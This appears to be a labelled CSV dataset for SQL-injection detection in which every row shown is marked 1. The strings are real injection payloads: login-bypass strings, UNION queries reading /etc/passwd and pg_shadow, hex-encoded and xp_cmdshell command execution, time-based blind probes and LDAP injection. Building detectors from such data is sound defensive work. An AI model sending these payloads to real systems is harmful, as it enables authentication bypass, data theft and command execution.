Sentence,Label
a' or 'a' = 'a,1
&apos;%20OR,1
as,1
asc,1
a' waitfor delay '0:0:10'--,1
'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >,1
bfilename,1
char%4039%41%2b%40SELECT,1
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
declare @q nvarchar (4000) select @q =,1
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),1
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1
declare @s varchar(22) select @s =,1
declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e,1
delete,1
desc,1
distinct,1
"'||(elt(-3+5,bin(15),ord(10),hex(char(45))))",1
'; exec master..xp_cmdshell,1
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
exec(@s),1
'; exec ('sel' + 'ect us' + 'er'),1
exec sp,1
'; execute immediate 'sel' || 'ect us' || 'er',1
exec xp,1
'; exec xp_regread,1
' group by userid having 1=1--,1
handler,1
having,1
' having 1=1--,1
"hi or 1=1 --""",1
hi' or 1=1 --,1
"""hi"""") or (""""a""""=""""a""",1
hi or a=a,1
hi' or 'a'='a,1
hi') or ('a'='a,1
'hi' or 'x'='x';,1
insert,1
like,1
limit,1
*(|(mail=*)),1
*(|(objectclass=*)),1
or,1
' or ''=',1
"or 0=0 #""",1
' or 0=0 --,1
' or 0=0 #,1
""" or 0=0 --",1
or 0=0 --,1
or 0=0 #,1
' or 1 --',1
' or 1/*,1
; or '1'='1',1
' or '1'='1,1
' or '1'='1'--,1
' or 1=1,1
' or 1=1 /*,1
' or 1=1--,1
' or 1=1--,1
'/**/or/**/1/**/=/**/1,1
‘ or 1=1 --,1
""" or 1=1--",1
or 1=1,1
or 1=1--,1
"or 1=1 or """"=",1
' or 1=1 or ''=',1
' or 1 in (select @@version)--,1
or%201=1,1
or%201=1 --,1
' or 2 > 1,1
' or 2 between 1 and 3,1
' or 3=3,1
‘ or 3=3 --,1
' or '7659'='7659,1
or a=a,1
or a = a,1
' or 'a'='a,1
' or a=a--,1
') or ('a'='a,1
""" or ""a""=""a",1
) or (a=a,1
order by,1
' or (EXISTS),1
or isNULL(1/0) /*,1
""" or isNULL(1/0) /*",1
' or 'something' like 'some%',1
' or 'something' = 'some'+'thing',1
' or 'text' = n'text',1
' or 'text' > 't',1
' or uid like '%,1
' or uname like '%,1
' or 'unusual' = 'unusual',1
' or userid like '%,1
' or user like '%,1
' or username like '%,1
' or username like char(37);,1
' or 'whatever' in ('whatever'),1
' -- &password=,1
password:*/=1--,1
PRINT,1
PRINT @@variable,1
procedure,1
replace,1
select,1
' select * from information_schema.tables--,1
' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,1
' (select top 1,1
--sp_password,1
'sqlattempt1,1
(sqlattempt2),1
'sqlvuln,1
'+sqlvuln,1
(sqlvuln),1
sqlvuln;,1
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
to_timestamp_tz,1
truncate,1
tz_offset,1
' UNION ALL SELECT,1
' union all select @@version--,1
' union select,1
uni/**/on sel/**/ect,1
' UNION SELECT,1
"' union select 1,load_file('/etc/passwd'),1,1,1;",1
) union select * from information_schema.tables;,1
"' union select * from users where login = char(114,111,111,116);",1
update,1
'||UTL_HTTP.REQUEST,1
",@variable",1
@variable,1
@var select @var as var into temp end --,1
\x27UNION SELECT,1
x' AND 1=(SELECT COUNT(*) FROM tabname); --,1
x' AND email IS NULL; --,1
x' AND members.email IS NULL; --,1
x' AND userid IS NULL; --,1
x' or 1=1 or 'x'='y,1
x' OR full_name LIKE '%Bob%,1
ý or 1=1 --,1
'-',1
' ',1
'&',1
'^',1
'*',1
' or ''-',1
' or '' ',1
' or ''&',1
' or ''^',1
' or ''*',1
"""-""",1
""" """,1
"""&""",1
"""^""",1
"""*""",1
""" or """"-""",1
""" or """" """,1
""" or """"&""",1
""" or """"^""",1
""" or """"*""",1
or true--,1
""" or true--",1
' or true--,1
""") or true--",1
') or true--,1
' or 'x'='x,1
') or ('x')=('x,1
')) or (('x'))=(('x,1
""" or ""x""=""x",1
""") or (""x"")=(""x",1
""")) or ((""x""))=((""x",1
or 1=1,1
or 1=1--,1
or 1=1#,1
or 1=1/*,1
admin' --,1
admin' #,1
admin'/*,1
admin' or '1'='1,1
admin' or '1'='1'--,1
admin' or '1'='1'#,1
admin' or '1'='1'/*,1
admin'or 1=1 or ''=',1
admin' or 1=1,1
admin' or 1=1--,1
admin' or 1=1#,1
admin' or 1=1/*,1
admin') or ('1'='1,1
admin') or ('1'='1'--,1
admin') or ('1'='1'#,1
admin') or ('1'='1'/*,1
admin') or '1'='1,1
admin') or '1'='1'--,1
admin') or '1'='1'#,1
admin') or '1'='1'/*,1
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
"admin"" --",1
"admin"" #",1
"admin""/*",1
"admin"" or ""1""=""1",1
"admin"" or ""1""=""1""--",1
"admin"" or ""1""=""1""#",1
"admin"" or ""1""=""1""/*",1
"admin""or 1=1 or """"=""",1
"admin"" or 1=1",1
"admin"" or 1=1--",1
"admin"" or 1=1#",1
"admin"" or 1=1/*",1
"admin"") or (""1""=""1",1
"admin"") or (""1""=""1""--",1
"admin"") or (""1""=""1""#",1
"admin"") or (""1""=""1""/*",1
"admin"") or ""1""=""1",1
"admin"") or ""1""=""1""--",1
"admin"") or ""1""=""1""#",1
"admin"") or ""1""=""1""/*",1
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
==,1
=,1
',1
' --,1
' #,1
' –,1
'--,1
'/*,1
'#,1
""" --",1
""" #",1
"""/*",1
' and 1='1,1
' and a='a,1
or 1=1,1
or true,1
' or ''=',1
""" or """"=""",1
1′) and '1′='1–,1
"' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",1
""" AND 1=0 UNION ALL SELECT """", ""81dc9bdb52d04dc20036dbd8313ed055",1
and 1=1,1
and 1=1–,1
' and 'one'='one,1
' and 'one'='one–,1
' group by password having 1=1--,1
' group by userid having 1=1--,1
' group by username having 1=1--,1
like '%',1
or 0=0 --,1
or 0=0 #,1
or 0=0 –,1
' or         0=0 #,1
' or 0=0 --,1
' or 0=0 #,1
' or 0=0 –,1
""" or 0=0 --",1
""" or 0=0 #",1
""" or 0=0 –",1
%' or '0'='0,1
or 1=1,1
or 1=1--,1
or 1=1/*,1
or 1=1#,1
or 1=1–,1
' or 1=1--,1
' or '1'='1,1
' or '1'='1'--,1
' or '1'='1'/*,1
' or '1'='1'#,1
' or '1′='1,1
' or 1=1,1
' or 1=1 --,1
' or 1=1 –,1
' or 1=1--,1
' or 1=1;#,1
' or 1=1/*,1
' or 1=1#,1
' or 1=1–,1
') or '1'='1,1
') or '1'='1--,1
') or '1'='1'--,1
') or '1'='1'/*,1
') or '1'='1'#,1
') or ('1'='1,1
') or ('1'='1--,1
') or ('1'='1'--,1
') or ('1'='1'/*,1
') or ('1'='1'#,1
'or'1=1,1
'or'1=1′,1
""" or ""1""=""1",1
""" or ""1""=""1""--",1
""" or ""1""=""1""/*",1
""" or ""1""=""1""#",1
""" or 1=1",1
""" or 1=1 --",1
""" or 1=1 –",1
""" or 1=1--",1
""" or 1=1/*",1
""" or 1=1#",1
""" or 1=1–",1
""") or ""1""=""1",1
""") or ""1""=""1""--",1
""") or ""1""=""1""/*",1
""") or ""1""=""1""#",1
""") or (""1""=""1",1
""") or (""1""=""1""--",1
""") or (""1""=""1""/*",1
""") or (""1""=""1""#",1
) or '1′='1–,1
) or ('1′='1–,1
' or 1=1 LIMIT 1;#,1
'or 1=1 or ''=',1
"""or 1=1 or """"=""",1
' or 'a'='a,1
' or a=a--,1
' or a=a–,1
') or ('a'='a,1
""" or ""a""=""a",1
""") or (""a""=""a",1
"') or ('a'='a and hi"") or (""a""=""a",1
' or 'one'='one,1
' or 'one'='one–,1
' or uid like '%,1
' or uname like '%,1
' or userid like '%,1
' or user like '%,1
' or username like '%,1
' or 'x'='x,1
') or ('x'='x,1
""" or ""x""=""x",1
' OR 'x'='x'#;,1
'=' 'or' and '=' 'or',1
"' UNION ALL SELECT 1, @@version;#",1
"' UNION ALL SELECT system_user(),user();#",1
"' UNION select table_schema,table_name FROM information_Schema.tables;#",1
"admin' and substring(password/text(),1,1)='7",1
"' and substring(password/text(),1,1)='7",1
' or 1=1 limit 1 -- -+,1
"'=""or'",1
"select versionnumber, version_timestamp from sysibm.sysversions;",1
select user from sysibm.sysdummy1;,1
select session_user from sysibm.sysdummy1;,1
select system_user from sysibm.sysdummy1;,1
select current server from sysibm.sysdummy1;,1
select name from sysibm.systables;,1
select grantee from syscat.dbauth;,1
select * from syscat.tabauth;,1
select * from syscat.dbauth where grantee = current user;,1
select * from syscat.tabauth where grantee = current user;,1
"select name, tbname, coltype from sysibm.syscolumns;",1
SELECT schemaname FROM syscat.schemata;,1
<username>' OR 1=1--,1
'OR '' = '	Allows authentication without a valid username.,1
<username>'--,1
"' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--",1
'OR 1=1--,1
create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;,1
select version();,1
select current_database();,1
select current_user;,1
select session_user;,1
select current_setting('log_connections');,1
select current_setting('log_statement');,1
select current_setting('port');,1
select current_setting('password_encryption');,1
select current_setting('krb_server_keyfile');,1
select current_setting('virtual_host');,1
select current_setting('port');,1
select current_setting('config_file');,1
select current_setting('hba_file');,1
select current_setting('data_directory');,1
select * from pg_shadow;,1
select * from pg_group;,1
create table myfile (input TEXT);,1
copy myfile from '/etc/passwd';,1
select * from myfile;copy myfile to /tmp/test;,1
)%20waitfor%20delay%20'0:0:20'%20/*,1
)%20waitfor%20delay%20'0:0:20'%20--,1
')%20waitfor%20delay%20'0:0:20'%20/*,1
')%20waitfor%20delay%20'0:0:20'%20--,1
""")%20waitfor%20delay%20'0:0:20'%20/*",1
""")%20waitfor%20delay%20'0:0:20'%20--",1
))%20waitfor%20delay%20'0:0:20'%20/*,1
))%20waitfor%20delay%20'0:0:20'%20--,1
'))%20waitfor%20delay%20'0:0:20'%20/*,1
'))%20waitfor%20delay%20'0:0:20'%20--,1
"""))%20waitfor%20delay%20'0:0:20'%20/*",1
"""))%20waitfor%20delay%20'0:0:20'%20--",1
",NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"',NULL)%20waifor%20delay%20'0:0:20'%20/*",1
"',NULL)%20waitfor%20delay%20'0:0:20'%20--",1
""",NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
""",NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"'),NULL)%20waifor%20delay%20'0:0:20'%20/*",1
"'),NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"""),NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"""),NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
""",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
""",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
""",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
""",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
waitfor delay '0:0:20' /*,1
waitfor delay '0:0:20' --,1
' waitfor delay '0:0:20' /*,1
' waitfor delay '0:0:20' --,1
""" waitfor delay '0:0:20' /*",1
""" waitfor delay '0:0:20' --",1
) waitfor delay '0:0:20' /*,1
) waitfor delay '0:0:20' --,1
)) waitfor delay '0:0:20' /*,1
)) waitfor delay '0:0:20' --,1
))) waitfor delay '0:0:20' /*,1
))) waitfor delay '0:0:20' --,1
)))) waitfor delay '0:0:20' /*,1
)))) waitfor delay '0:0:20' --,1
))))) waitfor delay '0:0:20' --,1
)))))) waitfor delay '0:0:20' --,1
') waitfor delay '0:0:20' /*,1
') waitfor delay '0:0:20' --,1
""") waitfor delay '0:0:20' /*",1
""") waitfor delay '0:0:20' --",1
')) waitfor delay '0:0:20' /*,1
')) waitfor delay '0:0:20' --,1
""")) waitfor delay '0:0:20' /*",1
""")) waitfor delay '0:0:20' --",1
'))) waitfor delay '0:0:20' /*,1
'))) waitfor delay '0:0:20' --,1
"""))) waitfor delay '0:0:20' /*",1
"""))) waitfor delay '0:0:20' --",1
')))) waitfor delay '0:0:20' /*,1
')))) waitfor delay '0:0:20' --,1
""")))) waitfor delay '0:0:20' /*",1
""")))) waitfor delay '0:0:20' --",1
'))))) waitfor delay '0:0:20' /*,1
'))))) waitfor delay '0:0:20' --,1
"""))))) waitfor delay '0:0:20' /*",1
"""))))) waitfor delay '0:0:20' --",1
')))))) waitfor delay '0:0:20' /*,1
')))))) waitfor delay '0:0:20' --,1
""")))))) waitfor delay '0:0:20' /*",1
""")))))) waitfor delay '0:0:20' --",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1
